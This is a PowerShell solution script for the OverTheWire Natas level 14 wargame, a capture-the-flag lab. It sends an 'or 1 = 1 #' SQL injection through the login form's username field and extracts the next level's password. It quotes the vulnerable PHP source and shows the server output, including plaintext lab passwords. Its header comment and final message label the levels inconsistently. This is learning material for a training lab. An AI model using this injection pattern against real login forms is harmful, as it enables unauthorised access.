
<#
Script to retrieve the password of level 9-10

#>
$url = "http://natas14.natas.labs.overthewire.org"
$creds = "natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#------------------------------------------------------------
# $a = (Invoke-WebRequest -uri $url -Method Post -Body $sec -proxy "http://localhost:8080" -Headers $headers).content 
# $a



# <form action="index.php" method="POST">
# Username: <input name="username"><br>
# Password: <input name="password"><br>
# <input type="submit" value="Login" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>


#------------------------------------------------------------


# Get source
# --------------------------------------------------------------------------------

# $url += "/index-source.html"
# $a = (Invoke-WebRequest -uri $url -Method Get -proxy "http://localhost:8080" -Headers $headers).content 
# $clean = [System.Web.HttpUtility]::HtmlDecode($a).split("<br />")
# $clean

# if(array_key_exists("username", $_REQUEST)) {
#     $link = mysql_connect('localhost', 'natas14', '<censored>');
#     mysql_select_db('natas14', $link);
#     
#     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
#     if(array_key_exists("debug", $_GET)) {
#         echo "Executing query: $query<br>";
#     }

#     if(mysql_num_rows(mysql_query($query, $link)) > 0) {
#             echo "Successful login! The password for natas15 is <censored><br>";
#     } else {
#             echo "Access denied!<br>";
#     }
#     mysql_close($link);
# } else {
# ?>

# <form action="index.php" method="POST">
# Username: <input name="username"><br>
# Password: <input name="password"><br>
# <input type="submit" value="Login" />
# </form>
# <? } ?>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
# </span>
# </code>


# --------------------------------------------------------------------------------



$parms = @{"username" = '"or 1 = 1 #"'
        # username="or 1 = 1 #"&password="test"
            "password" = "test"
}

$url = $url + "/index.php?debug=1"
$a = (Invoke-WebRequest -uri $url -Method Post -Body $parms -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 

# $a

# <div id="content">
# Executing query: SELECT * from users where username=""or 1 = 1 #"" and password="test"<br>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>


#-----------------------------------------------------------------------------------------------------------


$a = ($a | select-string  -allmatches "(\w{32})") 
$b = $a.matches[1].value



echo "The password for natas14 is $b"

# PS /home/voltron/OTW/natas/pshell_lang>  
# ./natas15.ps1                                                                                        
# The password for natas14 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J                                                                                  
# PS /home/voltron/OTW/natas/pshell_lang>    
